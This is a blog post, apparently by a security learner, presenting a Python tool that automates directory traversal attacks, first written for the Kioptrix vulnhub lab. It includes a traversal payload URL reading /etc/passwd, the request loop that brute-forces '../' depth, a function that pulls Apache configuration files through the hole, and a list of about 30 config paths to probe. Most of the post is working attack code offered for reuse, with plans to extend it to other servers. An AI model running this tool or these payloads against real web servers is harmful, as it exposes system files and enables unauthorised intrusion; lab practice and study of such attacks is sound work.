---
layout: post
author: Donald Murchison
category: pr0j3cts
title: "Directory Traversal Script"
---

{% highlight bash %}
http://vulnerable-site/index.php?path=../../../etc/passwd
{% endhighlight %}
<br>
This project is a simple python script I wrote to help automate directory traversal attacks. I started this project while I was practicing offensive techniques with the Kioptrix: 2014 (#5) vulnhub machine.

I will be posting a full write up of [Kioptrix: 2014 (#5)](#) in the near future.

The full directory traversal script is [here]({{ site.url }}/assets/traversal/directorytraversal.txt)

Take a look at the full script to uderstand what options can be specified at the command line. I have tried to write this in a way so that I can continue to add new features in the future. For now I will only go over the use for and apache server on a linux host.

To run the script I will specify the url (-u) and server (-s).
{% highlight bash %}
donald@comp:~$ python directorytraversal.py -u "http://vulnerable-site/index.php?path={}" -s apache
{% endhighlight %}

Two things to note about the -u option, are that the url should be in quotations and the parameter in the url which is vulnerable to directory traversal should be specified by {}.

I chose to specify the url this way so that I could easily use format function to place the series of "../" anywhere in the url.

After setting the options correctly, I needed to automate finding the root directory by trying access the /etc/passwd file. 

I searched for the passwd file because Kioptrix is a linux machine which will always have /etc/passwd.

{% highlight python %}

#Try up to 30
	for i in range(30):
		tmp = ""
		tmp = urllib.quote_plus(("..{}".format(slash))*(i+1))
		tmp += "{}"
		
		traversal = url.format(tmp)
		print traversal.format(localfile)
		r = requests.get(traversal.format(localfile))

		#print r.content
		if r.status_code == 200 and user in r.content:
		#	print "Done"
			with open(outpath+"dt-file.html",'w') as f:
				f.write(r.content)
			findConf(traversal,server,outpath)	
			break

{% endhighlight %} 

Above, is the main snippet of code to accomplish finding the root directory. Essentially, it is just a loop which will make a get request to the url with an increasing amount of "../" prepended to "/etc/passwd".

After making the request, it will check for a 200 status code and for "root", user variable, in the content. I added the check for user in content because Kioptrix was returning a 200 status code in every response. 

You might notice that the treversal variable was written in a weird way and contains a {} in the string. An example instance of traversal is below (minus the url encoding):
{% highlight bash %}
http://vulnerable-site/index.php?path=../../../{}
{% endhighlight %}
I then format the string with etc/passwd while passing it to the GET request. This way I have the correct traversal path for the root directory stored in a variable. 

The next thing I wanted to automate was finding the apache config file. The config file can have many different names or paths and I wanted to easily be able to test for each one.

I wrote a method which makes a get request for each entry in a list of possible config files. The naming convention for the list is ./{server}conflist

{% highlight python %}
def findConf(traversal,server,outpath):
	print "Trying to find config file"
	
	with open("./{}conflist".format(server)) as infile:
			for line in infile:
				r = requests.get(traversal.format(line.strip()))
				#print traversal.format(line.strip())
				if r.status_code == 200 and r.content != "":
					print "Found config {}".format(line)
					break

	#Use .html so I don't have to deal with formatting 
	with open(outpath+"config.html", 'w') as f:
		f.write(traversal.format(line.strip())+"\n\n")
		f.write(urllib.unquote(r.content))
{% endhighlight %}

Since I had the root directory path stored in traversal, I could pass the variable to my function and format the string with the different config files.

Below is my current list of paths to test for apache (linux):
{% highlight python %}
etc/httpd/httpd.conf
etc/httpd/apache2.conf
etc/httpd/conf/httpd.conf
etc/httpd/conf/apache2.conf
etc/conf/httpd.conf
etc/conf/apache2.conf
etc/apache2/httpd.conf
etc/apache2/apache2.conf
etc/apache22/httpd.conf
etc/apache22/apache2.conf
usr/local/etc/httpd/httpd.conf
usr/local/etc/httpd/apache2.conf
usr/local/etc/httpd/conf/httpd.conf
usr/local/etc/httpd/conf/apache2.conf
usr/local/etc/conf/httpd.conf
usr/local/etc/conf/apache2.conf
usr/local/etc/apache2/httpd.conf
usr/local/etc/apache2/apache2.conf
usr/local/etc/apache22/httpd.conf
usr/local/etc/apach22/httpd.conf
opt/etc/httpd/httpd.conf
opt/etc/httpd/apache2.conf
opt/etc/httpd/conf/httpd.conf
opt/etc/httpd/conf/apache2.conf
opt/etc/conf/httpd.conf
opt/etc/conf/apache2.conf
opt/etc/apache2/httpd.conf
opt/etc/apache2/apache2.conf
opt/etc/apache22/httpd.conf
opt/etc/apache22/apache2.conf
{% endhighlight %} 

Please contact me if you have suggestions for the apache config list or lists for other servers.

As I continue to learn, I will update this tool to be able to automate exploitation of different linux and windows servers.

This article will continue to be updated.

